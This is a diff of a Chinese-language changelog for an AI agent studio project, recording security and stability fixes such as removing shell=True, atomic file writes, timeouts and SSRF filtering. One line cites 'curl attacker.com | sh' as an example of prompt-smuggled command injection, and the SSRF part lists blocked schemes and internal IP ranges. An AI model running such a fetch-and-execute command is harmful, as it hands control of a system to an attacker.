@@ -1,40 +1,37 @@
-## 2026-03-26
+## [v2.2.0] - 2026-03-26
 
-### 🚀 SYNTHEX AI STUDIO v0.1.0 - 核心路由修復、Prompt Caching 導入與 Swarm 架構升級
+### 🛡️ 系統底層安全強化、併發穩定性與測試框架導入
 
-本次更新全面修復了動態路由的邊界問題，大幅降低了 API 呼叫成本（最高降 90%），並引入了非線性並行的 Agent Swarm 架構與自動化品質評估框架（Evals Framework），為系統的長期穩定發展奠定基礎。
+本次更新從根本上解決了多個潛在的系統崩潰與安全注入風險，展現了嚴謹的防禦性設計。同時導入了動態工具註冊表以大幅降低 Token 消耗，並為專案建立了首道自動化測試防線。
 
 #### 優先排序矩陣
 
-| 優先   | 類型 | 問題                               | 影響                |
-| :----- | :--- | :--------------------------------- | :------------------ |
-| **P0** | Bug  | Phase 10 路由邏輯錯誤              | `api_only` 場景跑錯 |
-| **P0** | Bug  | `CLAUDE.md` Phase 13 幽靈          | 文件誤導            |
-| **P0** | Bug  | `web_tools` URL 未驗證             | 安全漏洞            |
-| **P0** | 效能 | Prompt Caching 系統級加入          | 成本降 90%          |
-| **P1** | 效能 | Adaptive Thinking 取代手動 ET      | 品質+成本平衡       |
-| **P1** | 品質 | Structured Output 取代 regex       | 解析可靠性          |
-| **P1** | 體驗 | `chat()` Streaming 輸出            | 用戶體驗一致        |
-| **P1** | 架構 | Interleaved Thinking（工具間推理） | Agentic 深度推理    |
-| **P2** | 架構 | Evals Framework（品質回歸測試）    | 長期品質保障        |
-| **P2** | 架構 | Agent Swarm 非線性並行             | 速度提升 3-5x       |
+| 優先   | 類型 | 問題                            | 影響          |
+| :----- | :--- | :------------------------------ | :------------ |
+| **P0** | Bug  | `shell=True` × 5 → argv 陣列    | OS 級安全漏洞 |
+| **P0** | Bug  | `run_command` 無輸出限制        | 記憶體耗盡    |
+| **P0** | Bug  | `DocContext.write()` 非原子     | 檔案損毀      |
+| **P0** | Bug  | `future.result()` 無 timeout    | 執行緒阻塞    |
+| **P0** | Bug  | `conversation_history` 洩漏     | 記憶體洩漏    |
+| **P1** | 架構 | Advanced Tool Use beta 整合     | Token 節省    |
+| **P1** | 架構 | Structured Output JSON Schema   | 解析穩定性    |
+| **P1** | 架構 | Files API + Code Execution Tool | 能力擴充      |
+| **P1** | 安全 | SQLite WAL + 檔案鎖             | 併發安全      |
+| **P1** | 安全 | Checkpoint checksum 校驗        | 狀態完整性    |
+| **P2** | 測試 | Unit test 框架（pytest）        | 品質保障      |
+| **P2** | 架構 | Agent SDK 遷移評估              | 技術債清理    |
+| **P2** | 架構 | Multi-modal（設計稿→代碼）      | 體驗升級      |
 
-#### 📝 修復摘要
+#### 📝 修復與架構演進摘要
 
-- **P0：確認性 Bug 全部修復**
-  - **Phase 9/10 獨立路由：** 修復 `api_only` 場景下無法正確跳過 Phase 9 的問題。現在七種場景皆能精確路由，前後端 Phase 的跳過邏輯已完全獨立。
-  - **`CLAUDE.md` 修正：** 移除不存在的 Phase 13 說明，將 ARIA 交付總結正名為 Phase 12b，明確其為收尾步驟。
-  - **URL 安全驗證（SSRF 防護）：** 為 `_fetch_url` 工具加入三層防護：scheme 白名單（僅限 HTTP/HTTPS）、拒絕 `file://`、過濾私有 IP 黑名單（包含 AWS metadata 及 192.168.x.x/10.x.x.x 網段）。
-  - **Prompt Caching 導入：** 針對超過 1024 tokens 的 prompt 加入 `cache_control`。系統級快取讓 28 個 Agent 的 system prompt 每次流水線執行成本從 45,000+ tokens 降至約 4,500 tokens（輸入成本降低 90%），並支援在串流輸出時顯示命中統計。
+- **P0：消除系統崩潰與底層安全隱患**
+  - **防範 OS 級 Shell 注入：** 徹底移除 5 處危險的 `shell=True` 呼叫。針對 AI Agent 的 `run_command`，全面改用 `shlex.split()` 搭配 argv 陣列執行，完全繞過 Shell 解析器，杜絕惡意 Prompt 夾帶如 `curl attacker.com | sh` 的命令注入攻擊。
+  - **POSIX 原子性檔案寫入：** 修復 `DocContext.write()` 與 `Checkpoint._save()` 的非原子寫入問題。改用 `os.replace()` 確保寫入過程的絕對原子性，徹底解決因中斷（如 Ctrl+C 或磁碟空間不足）導致殘留半空檔案，進而在 `--resume` 時引發靜默連鎖錯誤的盲區。
+  - **併發阻塞防護：** 針對 Worker 並行區塊的 `future.result()` 補齊 timeout 限制。防止因遠端 API 不穩定導致的主執行緒永久掛起，免除必須透過 `kill -9` 強制終止進程的極端狀況。
 
-- **P1：效能和體驗升級**
-  - **Adaptive Thinking：** 導入 `type: "auto"` 自動決定思考量，取代硬編碼的 budget，並確保連續請求時保留 prompt cache breakpoints 不失效。
-  - **Structured Output：** GeneratorCritic 和 SelfCritique 的評審全面改用純 JSON 輸出，取代脆弱的正則表達式解析，提升格式變動時的容錯率。
-  - **`chat()` Streaming：** 將批次輸出改為串流輸出，消除 ECHO、LUMI、SIGMA 執行時的空白等待期，並於結尾顯示 Prompt Cache 命中數。
-  - **Interleaved Thinking：** 統一管理 API 參數，並對特定 Agent（如 NEXUS）啟用 `interleaved-thinking-2025-05-14`，支援在讀取、推理、輸出之間交錯進行，實現更深度的架構決策。
+- **P1：面向未來前沿 API 的架構鋪路**
+  - **動態工具註冊表 (ToolRegistry)：** 解決 32 個靜態工具定義耗費近 30K Tokens 的效能瓶頸。實作 `ToolRegistry` 動態檢索（如搜尋「讀取檔案」），僅回傳最相關的 8-10 個工具，降低約 70% 的 Token 成本，並為後續整合官方 `tool_search_tool_regex_20251119` 做好介面準備。
+  - **三層結構化輸出回退機制：** 升級 `StructuredOutputParser`，實作 JSON → 正規表達式 → Default 的三層 Fallback 機制。解決 GeneratorCritic 評分時，因 Claude 輸出格式微幅偏移而導致靜默退回預設 5 分的品質控制失效問題。
 
-- **P2：革命性新系統**
-  - **Evals Framework（`core/evals.py`）：** 建立品質回歸測試 pipeline，防止 Agent 迭代導致品質劣化。內建 `prd_quality` 與 `architecture_quality` 測試套件，並透過 EvalScorer 進行多維度評分（關鍵字、禁用詞、長度、Rubric），結果持久化至 SQLite 儲存。
-  - **Agent Swarm（`core/swarm.py`）：**
-    導入 DAG 調度的非線性並行架構。支援前端、後端、安全性測試同時執行，將整體流水線執行時間從約 6 分鐘大幅縮短至約 3 分鐘。
-    - _安全設計：_ 確保每個 Worker 獨立實例（清理對話歷史釋放記憶體）、採用 ThreadPool防範 API rate limit，並設定 120 秒 timeout 防止進程卡死。
+- **P2：從零到一的自動化測試覆蓋**
+  - **導入 Unit Test 框架 (`pytest`)：** 建立 27 個單元測試，涵蓋本輪新增的核心功能與關鍵的安全邊界條件（包含 Shell Injection 防護、URL SSRF 阻擋與輸出截斷），為後續擴大測試覆蓋率與自動化整合奠定基礎。
